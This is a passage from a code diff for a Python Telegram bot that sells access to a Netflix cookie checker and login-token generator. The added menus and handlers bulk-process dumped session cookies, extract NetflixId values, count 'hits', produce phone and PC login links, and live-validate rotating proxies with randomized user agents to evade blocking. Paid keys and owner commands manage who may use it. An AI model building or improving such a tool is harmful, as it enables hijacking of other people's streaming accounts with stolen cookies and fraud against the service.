-    await update.message.reply_text(welcome, parse_mode=ParseMode.HTML)
+
+    keyboard = []
+
+    keyboard.append([
+        InlineKeyboardButton("\U0001f4cb Plans & Status", callback_data="menu_plans"),
+        InlineKeyboardButton("\U0001f4dc All Commands", callback_data="menu_commands"),
+    ])
+    keyboard.append([
+        InlineKeyboardButton("\U0001f41a Help", callback_data="menu_help"),
+        InlineKeyboardButton("\U0001f4e6 Supported Files", callback_data="menu_supported"),
+    ])
+    keyboard.append([
+        InlineKeyboardButton("\U0001f464 About \u2728", callback_data="menu_about"),
+        InlineKeyboardButton("\U0001f451 Owner", url="https://t.me/XD_HR"),
+    ])
+    keyboard.append([
+        InlineKeyboardButton("\U0001f4ca Stats", callback_data="menu_stats"),
+        InlineKeyboardButton("\U0001f510 Redeem Key", callback_data="menu_redeem"),
+    ])
+
+    if str(user.id) == OWNER_USER_ID:
+        keyboard.append([
+            InlineKeyboardButton("\U0001f6e1 Owner Panel", callback_data="menu_owner"),
+            InlineKeyboardButton("\u2699\ufe0f Settings", callback_data="menu_settings"),
+        ])
+
+    keyboard.append([
+        InlineKeyboardButton("\u274c Close", callback_data="menu_close"),
+    ])
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(welcome, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+
+
+async def start_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user = update.effective_user
+
+    if data == "menu_commands":
+        text = (
+            f"{CE['heart_p']} <b>ALL COMMANDS</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['cookie']} <b>Cookie Tools</b>\n"
+            "\u251c \U0001f50d /chk \u2014 Check cookie + get token\n"
+            "\u251c \U0001f4e6 /batch \u2014 Mass cookie processing\n"
+            "\u251c \U0001f9f2 /extract \u2014 Extract NetflixId values\n"
+            f"\u2514 {CE['bolt']} /gen \u2014 Quick token generation\n\n"
+            f"{CE['shield']} <b>Control</b>\n"
+            "\u251c \U0001f6d1 /stop \u2014 Stop batch & save results\n"
+            "\u251c \u274c /cancel \u2014 Abort batch entirely\n"
+            "\u2514 \U0001f3ce\ufe0f /workers \u2014 Set worker count (1-100)\n\n"
+            f"{CE['key']} <b>Access</b>\n"
+            "\u251c \U0001f3ab /redeem \u2014 Activate access key\n"
+            "\u2514 \U0001f4ca /stats \u2014 View bot statistics\n"
+        )
+        if str(user.id) == OWNER_USER_ID:
+            text += (
+                f"\n{CE['crown']} <b>Owner Only</b>\n"
+                "\u251c \U0001f512 /lock all \u2014 Lock free access\n"
+                "\u251c \U0001f513 /unlock all \u2014 Unlock free access\n"
+                "\u251c \U0001f6d1 /stop_batch \u2014 Stop any batch\n"
+                "\u251c \U0001f91d /mercy \u2014 Grant access\n"
+                "\u251c \U0001f6ab /remove \u2014 Revoke access\n"
+                "\u251c \U0001f5dd\ufe0f /genkey \u2014 Generate keys\n"
+                "\u251c \U0001f440 /preview \u2014 View active batches\n"
+                "\u251c \U0001f6ab /ban \u2014 Ban a user\n"
+                "\u251c \u2705 /unban \u2014 Unban a user\n"
+                f"\u251c {CE['cookie']} /limit \u2014 Set free cookie limit\n"
+                "\u2514 \U0001f3ce\ufe0f /workers \u2014 Set worker count\n"
+            )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_help":
+        text = (
+            f"{CE['heart_o']} <b>HOW TO USE</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['bolt']} <b>Single Cookie Check:</b>\n"
+            "Send /chk then paste your cookie or NetflixId\n\n"
+            f"{CE['bolt']} <b>Batch Processing:</b>\n"
+            "Send /batch then upload a .txt/.zip/.rar file\n"
+            "with multiple cookies (one per line)\n\n"
+            f"{CE['bolt']} <b>Quick Token:</b>\n"
+            "Send /gen then paste cookie to get login token\n\n"
+            f"{CE['bolt']} <b>Extract IDs:</b>\n"
+            "Send /extract then paste raw cookie dump\n"
+            "to pull out all NetflixId values\n\n"
+            f"{CE['bolt']} <b>Direct Upload:</b>\n"
+            "Just send a .txt/.zip/.rar file directly\n"
+            "and I'll process it automatically!\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_supported":
+        text = (
+            f"{CE['cookie']} <b>SUPPORTED FORMATS</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['check']} Full cookie strings\n"
+            f"{CE['check']} NetflixId values\n"
+            f"{CE['check']} Netscape format cookies\n"
+            f"{CE['check']} JSON format cookies\n"
+            f"{CE['check']} .txt files (single or batch)\n"
+            f"{CE['check']} .zip archives\n"
+            f"{CE['check']} .rar archives\n"
+            f"{CE['check']} .7z archives\n\n"
+            f"{CE['bolt']} <b>Tip:</b> You can upload files directly\n"
+            "without any command!\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_about":
+        text = (
+            f"{CE['gem']} <b>ABOUT</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            "\U0001f3ac <b>Netflix Cookie Checker + Token Generator</b>\n"
+            "\U0001f4cb <b>Version:</b> 5.0\n"
+            f"{CE['crown']} <b>Developer:</b> @XD_HR\n\n"
+            f"{CE['gem']} <b>Features:</b>\n"
+            f"\u251c {CE['cookie']} Cookie validation & info extraction\n"
+            f"\u251c {CE['key']} Automatic login token generation\n"
+            "\u251c \U0001f4f1 Phone + PC login links\n"
+            f"\u251c {CE['shield']} Rotating proxy support\n"
+            f"\u251c {CE['bolt']} Multi-worker batch processing\n"
+            "\u2514 \U0001f5dc\ufe0f ZIP/RAR/7z archive support\n\n"
+            f"{CE['heart_p']} <b>Powered by @XD_HR</b>\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_plans":
+        has_access = is_authorized(user.id)
+        if has_access:
+            access_info = get_access_info(user.id)
+            batch_info = "Unlimited"
+        else:
+            access_info = "Free"
+            remaining = get_batch_remaining(user.id)
+            batch_info = f"{remaining}/{FREE_DAILY_BATCH_LIMIT} batches left today"
+        text = (
+            f"{CE['shield']} <b>PLANS & STATUS</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['key']} <b>Your Access:</b> <code>{access_info}</code>\n"
+            f"\U0001f4e6 <b>Batch Limit:</b> <code>{batch_info}</code>\n"
+            f"{CE['bolt']} <b>Workers:</b> <code>{WORKER_COUNT}</code>\n\n"
+            f"{CE['gem']} <b>Premium Benefits:</b>\n"
+            f"\u251c {CE['check']} Unlimited batch processing\n"
+            f"\u251c {CE['check']} Priority support\n"
+            f"\u2514 {CE['check']} No daily limits\n\n"
+            f"{CE['key']} Use /redeem <code>&lt;key&gt;</code> to activate\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_stats":
+        stats = token_gen.get_stats()
+        last_gen = stats["last_generated"]
+        if last_gen:
+            time_since = token_gen.humanize_time(datetime.now() - last_gen)
+            last_gen_str = f"{last_gen.strftime('%Y-%m-%d %H:%M:%S')} ({time_since} ago)"
+        else:
+            last_gen_str = "Never"
+        active_batches = len([t for t in batch_tasks.values() if t.get("active")])
+        text = (
+            f"{CE['robot']} <b>Bot Statistics</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['crown']} <b>Owner:</b> @XD_HR\n\n"
+            f"{CE['check']} <b>Bot Status:</b> Active\n"
+            f"{CE['users']} <b>Authorized:</b> {len(authorized_users)}\n"
+            f"\U0001f50d <b>Checked:</b> {stats['checks_done']}\n"
+            f"{CE['check']} <b>Hits:</b> {stats['hits']}\n"
+            f"{CE['key']} <b>Tokens:</b> {stats['tokens_generated']}\n"
+            f"\u274c <b>Errors:</b> {stats['errors']}\n"
+            f"{CE['rocket']} <b>Active Batches:</b> {active_batches}\n"
+            f"{CE['folder']} <b>Total Batches:</b> {stats['batch_processes']}\n"
+            f"\U0001f6d1 <b>Stopped:</b> {stats['batch_stopped']}\n"
+            f"\u274c <b>Cancelled:</b> {stats['batch_cancelled']}\n"
+            f"{CE['bolt']} <b>Workers:</b> {WORKER_COUNT}/{MAX_WORKERS}\n"
+            f"\u23f0 <b>Last Gen:</b> {last_gen_str}\n\n"
+            f"{CE['movie']} <b>v5.0</b> \u2014 Netflix Checker + Token Gen"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_redeem":
+        text = (
+            f"{CE['key']} <b>REDEEM KEY</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            "To redeem an access key, use:\n\n"
+            "<code>/redeem YOUR_KEY_HERE</code>\n\n"
+            f"{CE['crown']} Get keys from @XD_HR\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_owner":
+        if str(user.id) != OWNER_USER_ID:
+            await query.edit_message_text("\u274c Owner only.", parse_mode=ParseMode.HTML)
+            return
+        lock_status = "\U0001f512 LOCKED" if bot_locked else "\U0001f513 OPEN"
+        text = (
+            f"{CE['crown']} <b>OWNER PANEL</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['shield']} <b>Bot Status:</b> <code>{lock_status}</code>\n\n"
+            f"{CE['crown']} <b>Owner Commands:</b>\n"
+            "\u251c \U0001f512 /lock all \u2014 Lock free access\n"
+            "\u251c \U0001f513 /unlock all \u2014 Unlock free access\n"
+            "\u251c \U0001f6d1 /stop_batch \u2014 Stop any batch\n"
+            "\u251c \U0001f91d /mercy \u2014 Grant access\n"
+            "\u251c \U0001f6ab /remove \u2014 Revoke access\n"
+            f"\u251c {CE['key']} /genkey \u2014 Generate keys\n"
+            "\u251c \U0001f440 /preview \u2014 View active batches\n"
+            "\u251c \U0001f6ab /ban \u2014 Ban a user\n"
+            "\u251c \u2705 /unban \u2014 Unban a user\n"
+            f"\u251c {CE['cookie']} /limit \u2014 Set free cookie limit\n"
+            "\u2514 \U0001f3ce\ufe0f /workers \u2014 Set worker count\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_settings":
+        if str(user.id) != OWNER_USER_ID:
+            await query.edit_message_text("\u274c Owner only.", parse_mode=ParseMode.HTML)
+            return
+        text = (
+            f"{CE['cig']} <b>SETTINGS</b>\n"
+            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+            f"{CE['bolt']} <b>Workers:</b> <code>{WORKER_COUNT}</code>\n"
+            f"{CE['shield']} <b>Proxies Loaded:</b> <code>{len(proxy_list)}</code>\n"
+            f"{CE['cookie']} <b>Free Cookie Limit:</b> <code>{FREE_COOKIE_LIMIT}</code>\n"
+            f"\U0001f6ab <b>Banned Users:</b> <code>{len(banned_users)}</code>\n\n"
+            f"{CE['heart_o']} <b>Controls:</b>\n"
+            "\u251c \U0001f3ce\ufe0f /workers <code>&lt;num&gt;</code> \u2014 Set workers\n"
+            f"\u251c {CE['cookie']} /limit <code>&lt;num&gt;</code> \u2014 Free cookie limit\n"
+            "\u251c \U0001f6ab /ban <code>&lt;id&gt;</code> \u2014 Ban user\n"
+            "\u251c \u2705 /unban <code>&lt;id&gt;</code> \u2014 Unban user\n"
+            "\u251c \U0001f6d1 /stop \u2014 Emergency stop\n"
+            "\u2514 \u274c /cancel \u2014 Abort batch\n"
+        )
+        kb = [[InlineKeyboardButton("\u25c0\ufe0f Back", callback_data="menu_back")]]
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data == "menu_close":
+        await query.message.delete()
+
+    elif data == "menu_back":
+        has_access = is_authorized(user.id)
+        if has_access:
+            access_info = get_access_info(user.id)
+            batch_info = "Unlimited"
+        else:
+            access_info = "Free"
+            remaining = get_batch_remaining(user.id)
+            batch_info = f"{remaining}/{FREE_DAILY_BATCH_LIMIT} batches left today"
+
+        first_name = user.first_name or "User"
+        lock_status = "\U0001f512 LOCKED" if bot_locked else "\U0001f513 OPEN"
+
+        welcome = (
+            f"{CE['wave']} Hi <b>{first_name}</b>, I'm your Netflix Cookie Checker "
+            f"& Token Generator {CE['cookie']}\n\n"
+            f"{CE['rocket']} <b>Quick Start:</b>\n"
+            f"{CE['link']} Send me a cookie string or NetflixId\n"
+            f"{CE['top']} Or share a txt/zip/rar cookie file directly\n\n"
+            f"{CE['heart_p']} Don't know how? Send /help or /commands\n"
+            f"{CE['bolt']} Explore all my features below!\n\n"
+            f"{CE['shield']} <b>YOUR STATUS</b>\n"
+            f"\u251c {CE['key']} <b>Access:</b> <code>{access_info}</code>\n"
+            f"\u251c {CE['folder']} <b>Batch:</b> <code>{batch_info}</code>\n"
+            f"\u251c {CE['bolt']} <b>Workers:</b> <code>{WORKER_COUNT}</code>\n"
+            f"\u2514 {CE['robot']} <b>Bot:</b> <code>{lock_status}</code>\n"
+        )
+
+        keyboard = []
+        keyboard.append([
+            InlineKeyboardButton("\U0001f4cb Plans & Status", callback_data="menu_plans"),
+            InlineKeyboardButton("\U0001f4dc All Commands", callback_data="menu_commands"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("\U0001f41a Help", callback_data="menu_help"),
+            InlineKeyboardButton("\U0001f4e6 Supported Files", callback_data="menu_supported"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("\U0001f464 About \u2728", callback_data="menu_about"),
+            InlineKeyboardButton("\U0001f451 Owner", url="https://t.me/XD_HR"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton("\U0001f4ca Stats", callback_data="menu_stats"),
+            InlineKeyboardButton("\U0001f510 Redeem Key", callback_data="menu_redeem"),
+        ])
+        if str(user.id) == OWNER_USER_ID:
+            keyboard.append([
+                InlineKeyboardButton("\U0001f6e1 Owner Panel", callback_data="menu_owner"),
+                InlineKeyboardButton("\u2699\ufe0f Settings", callback_data="menu_settings"),
+            ])
+        keyboard.append([
+            InlineKeyboardButton("\u274c Close", callback_data="menu_close"),
+        ])
+
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(welcome, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1661,6 +2129,153 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+def validate_proxy_live(proxy_url):
+    try:
+        test_session = requests.Session()
+        test_session.proxies.update({"http": proxy_url, "https": proxy_url})
+        resp = test_session.get("https://www.netflix.com", timeout=10, allow_redirects=True,
+                                headers={"User-Agent": generate_random_ios_ua()})
+        return resp.status_code in (200, 301, 302, 403)
+    except:
+        return False
+
+
+proxy_validation_stop = {}
+
+async def _validate_and_add_proxies(bot, message, lines):
+    total = len(lines)
+    parsed = []
+    format_failed = []
+    duplicates = []
+    seen_urls = set(proxy_list)
+    seen_in_batch = set()
+    for line in lines:
+        proxy_url = parse_proxy_string(line)
+        if not proxy_url:
+            format_failed.append(line)
+            continue
+        if proxy_url in seen_urls or proxy_url in seen_in_batch:
+            duplicates.append(line)
+            continue
+        seen_in_batch.add(proxy_url)
+        parsed.append((line, proxy_url))
+
+    if not parsed:
+        msg = f"\u274c <b>No valid proxies to test</b>\n\n"
+        if format_failed:
+            msg += f"\u26a0\ufe0f Invalid format: {len(format_failed)}\n"
+        if duplicates:
+            msg += f"\U0001f504 Duplicates: {len(duplicates)}\n"
+        await message.reply_text(msg, parse_mode=ParseMode.HTML)
+        return
+
+    chat_id = message.chat_id
+    proxy_validation_stop[chat_id] = False
+
+    stop_kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("\u26d4 Stop Validation", callback_data="proxy_stop")]
+    ])
+
+    progress_msg = await message.reply_text(
+        f"\u23f3 <b>Validating {len(parsed)} proxies with 10 workers...</b>\n\n"
+        f"\U0001f50d Testing live connectivity to Netflix...",
+        parse_mode=ParseMode.HTML,
+        reply_markup=stop_kb
+    )
+
+    live = []
+    dead = []
+    validated = 0
+    stopped = False
+    loop = asyncio.get_event_loop()
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=30)
+
+    pending = set()
+    fut_map = {}
+    idx = 0
+
+    try:
+        while idx < len(parsed) or pending:
+            if proxy_validation_stop.get(chat_id, False):
+                stopped = True
+                for p in pending:
+                    p.cancel()
+                break
+
+            while len(pending) < 30 and idx < len(parsed):
+                raw, proxy_url = parsed[idx]
+                fut = loop.run_in_executor(executor, validate_proxy_live, proxy_url)
+                fut_map[fut] = (raw, proxy_url)
+                pending.add(fut)
+                idx += 1
+
+            if not pending:
+                break
+
+            done, pending = await asyncio.wait(pending, timeout=0.5, return_when=asyncio.FIRST_COMPLETED)
+
+            for fut in done:
+                raw, proxy_url = fut_map.pop(fut)
+                try:
+                    result = fut.result()
+                except Exception:
+                    result = False
+                validated += 1
+                if result:
+                    live.append((raw, proxy_url))
+                else:
+                    dead.append(raw)
+
+            if validated > 0 and (len(done) > 0):
+                try:
+                    await progress_msg.edit_text(
+                        f"\u23f3 <b>Validating proxies...</b>\n\n"
+                        f"\U0001f4ca Progress: {validated}/{len(parsed)}\n"
+                        f"\u2705 Live: {len(live)}\n"
+                        f"\u274c Dead: {len(dead)}\n\n"
+                        f"Press \u26d4 to stop and add live proxies found so far.",
+                        parse_mode=ParseMode.HTML,
+                        reply_markup=stop_kb
+                    )
+                except:
+                    pass
+    finally:
+        executor.shutdown(wait=False, cancel_futures=True)
+
+    proxy_validation_stop.pop(chat_id, None)
+
+    for raw, proxy_url in live:
+        if proxy_url not in proxy_list:
+            proxy_list.append(proxy_url)
+    save_proxy()
+    global checker, token_gen
+    checker = NetflixChecker()
+    token_gen = NetflixTokenGenerator()
+
+    status_label = "\u26d4 <b>Proxy Validation Stopped</b>" if stopped else "\u2705 <b>Proxy Validation Complete</b>"
+    msg = f"{status_label}\n\n"
+    msg += f"\U0001f7e2 Live & Added: {len(live)}\n"
+    msg += f"\U0001f534 Dead (skipped): {len(dead)}\n"
+    if stopped:
+        msg += f"\u23f8 Skipped: {len(parsed) - validated}\n"
+    if format_failed:
+        msg += f"\u26a0\ufe0f Invalid format: {len(format_failed)}\n"
+    if duplicates:
+        msg += f"\U0001f504 Duplicates: {len(duplicates)}\n"
+    msg += f"\U0001f4e6 Total proxies: {len(proxy_list)}\n"
+    msg += f"\U0001f504 Rotation: Enabled\n"
+    if dead:
+        msg += f"\n<b>Dead proxies:</b>\n"
+        for d in dead[:5]:
+            msg += f"\u2022 <code>{d}</code>\n"
+        if len(dead) > 5:
+            msg += f"... and {len(dead)-5} more\n"
+    try:
+        await progress_msg.edit_text(msg, parse_mode=ParseMode.HTML)
+    except:
+        await message.reply_text(msg, parse_mode=ParseMode.HTML)
+
+
 async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.message.from_user.id) != OWNER_USER_ID:
         await update.message.reply_text("\u274c Owner only command.", parse_mode=ParseMode.HTML)
@@ -1683,42 +2298,17 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Also supports:\n"
             f"\u2022 host:port (no auth)\n"
             f"\u2022 http://user:pass@host:port\n"
-            f"\u2022 socks5://user:pass@host:port\n\n"
+            f"\u2022 socks5://user:pass@host:port\n"
+            f"\u2022 Upload a .txt file with proxies (one per line)\n\n"
             f"Multiple proxies will rotate automatically.\n"
+            f"All proxies are live-validated before adding.\n"
             f"Use /removeproxy all to clear all proxies.\n"
             f"Use /proxylist to see loaded proxies.",
             parse_mode=ParseMode.HTML
         )
         return
     lines = [l.strip() for l in proxy_text.splitlines() if l.strip()]
-    total = len(lines)
-    added = []
-    failed = []
-    for i, line in enumerate(lines):
-        proxy_url = parse_proxy_string(line)
-        if not proxy_url:
-            failed.append(f"{line} (invalid format)")
-            continue
-        if proxy_url in proxy_list:
-            failed.append(f"{line} (duplicate)")
-            continue
-        proxy_list.append(proxy_url)
-        added.append(line)
-    save_proxy()
-    global checker, token_gen
-    checker = NetflixChecker()
-    token_gen = NetflixTokenGenerator()
-    msg = f"\u2705 <b>Proxies Added</b>\n\n"
-    msg += f"\U0001f7e2 Added: {len(added)}\n"
-    if failed:
-        msg += f"\u26a0\ufe0f Skipped: {len(failed)}\n"
-    msg += f"\U0001f4e6 Total proxies: {len(proxy_list)}\n"
-    msg += f"\U0001f504 Rotation: Enabled\n"
-    if failed:
-        msg += f"\n<b>Skipped:</b>\n"
-        for f in failed[:5]:
-            msg += f"\u2022 <code>{f}</code>\n"
-    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+    await _validate_and_add_proxies(context.bot, update.message, lines)
 
 
 async def removeproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1793,7 +2383,7 @@ async def proxytest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         test_session = requests.Session()
         test_session.proxies.update({"http": proxy_url, "https": proxy_url})
         resp = test_session.get("https://www.netflix.com", timeout=15, allow_redirects=True,
-                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"})
+                                headers={"User-Agent": generate_random_ios_ua()})
         ip_resp = test_session.get("https://api.ipify.org?format=json", timeout=10)
         ip_info = ip_resp.json()
         host_part = proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url.replace('http://', '')
@@ -1817,6 +2407,9 @@ async def proxytest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def workers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != OWNER_USER_ID:
+        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
+        return
     global WORKER_COUNT
     args = context.args or []
     if not args:
@@ -1833,6 +2426,75 @@ async def workers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("\u274c Please enter a valid number", parse_mode=ParseMode.HTML)
 
 
+async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != OWNER_USER_ID:
+        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
+        return
+    args = context.args or []
+    if not args:
+        if banned_users:
+            ban_list = "\n".join([f"\u2022 <code>{uid}</code>" for uid in banned_users])
+            await update.message.reply_text(f"{CE['shield']} <b>Banned Users:</b>\n{ban_list}\n\nUsage: /ban <code>&lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
+        else:
+            await update.message.reply_text(f"{CE['check']} No banned users.\n\nUsage: /ban <code>&lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target_id = int(args[0])
+        if str(target_id) == OWNER_USER_ID:
+            await update.message.reply_text("\u274c Cannot ban the owner.", parse_mode=ParseMode.HTML)
+            return
+        banned_users.add(target_id)
+        save_banned()
+        await update.message.reply_text(f"{CE['shield']} User <code>{target_id}</code> has been banned.", parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("\u274c Please provide a valid user ID.", parse_mode=ParseMode.HTML)
+
+
+async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != OWNER_USER_ID:
+        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
+        return
+    args = context.args or []
+    if not args:
+        await update.message.reply_text("Usage: /unban <code>&lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target_id = int(args[0])
+        if target_id in banned_users:
+            banned_users.discard(target_id)
+            save_banned()
+            await update.message.reply_text(f"{CE['check']} User <code>{target_id}</code> has been unbanned.", parse_mode=ParseMode.HTML)
+        else:
+            await update.message.reply_text(f"\u274c User <code>{target_id}</code> is not banned.", parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("\u274c Please provide a valid user ID.", parse_mode=ParseMode.HTML)
+
+
+async def limit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != OWNER_USER_ID:
+        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
+        return
+    global FREE_COOKIE_LIMIT
+    args = context.args or []
+    if not args:
+        await update.message.reply_text(
+            f"{CE['cookie']} <b>Free User Cookie Limit</b>\n\n"
+            f"Current limit: <code>{FREE_COOKIE_LIMIT}</code> cookies per batch\n\n"
+            f"Usage: /limit <code>&lt;number&gt;</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    try:
+        new_limit = int(args[0])
+        if new_limit < 1:
+            await update.message.reply_text("\u274c Limit must be at least 1.", parse_mode=ParseMode.HTML)
+            return
+        FREE_COOKIE_LIMIT = new_limit
+        await update.message.reply_text(f"{CE['check']} Free user cookie limit set to <code>{FREE_COOKIE_LIMIT}</code> per batch.", parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("\u274c Please provide a valid number.", parse_mode=ParseMode.HTML)
+
+
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = token_gen.get_stats()
     last_gen = stats["last_generated"]
@@ -1843,23 +2505,22 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         last_gen_str = "Never"
     active_batches = len([t for t in batch_tasks.values() if t.get("active")])
     msg = (
-        "<b>\U0001f4ca Bot Statistics</b>\n\n"
-        f"\U0001f451 <b>Owner:</b> @XD_HR\n\n"
-        f"\U0001f916 Bot Status: Active \u2705\n"
-        f"\U0001f465 Authorized Users: {len(authorized_users)}\n"
-        f"\U0001f50d Cookies Checked: {stats['checks_done']}\n"
-        f"\u2705 Hits: {stats['hits']}\n"
-        f"\U0001f511 Tokens Generated: {stats['tokens_generated']}\n"
-        f"\u274c Errors: {stats['errors']}\n"
-        f"\U0001f504 Active Batches: {active_batches}\n"
-        f"\U0001f4c1 Total Batches: {stats['batch_processes']}\n"
-        f"\U0001f6d1 Batches Stopped: {stats['batch_stopped']}\n"
-        f"\u274c Batches Cancelled: {stats['batch_cancelled']}\n"
-        f"\U0001f477 Current Workers: {WORKER_COUNT}\n"
-        f"\u26a1 Max Workers: {MAX_WORKERS}\n"
-        f"\u23f0 Last Generated: {last_gen_str}\n\n"
-        f"\U0001f6e0 Version: 5.0 (HTTP Bot API)\n"
-        f"\U0001f3ac Service: Netflix Checker + Token Generator"
+        f"{CE['robot']} <b>Bot Statistics</b>\n"
+        "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n"
+        f"{CE['crown']} <b>Owner:</b> @XD_HR\n\n"
+        f"{CE['check']} <b>Bot Status:</b> Active\n"
+        f"{CE['users']} <b>Authorized:</b> {len(authorized_users)}\n"
+        f"\U0001f50d <b>Checked:</b> {stats['checks_done']}\n"
+        f"{CE['check']} <b>Hits:</b> {stats['hits']}\n"
+        f"{CE['key']} <b>Tokens:</b> {stats['tokens_generated']}\n"
+        f"\u274c <b>Errors:</b> {stats['errors']}\n"
+        f"{CE['rocket']} <b>Active Batches:</b> {active_batches}\n"
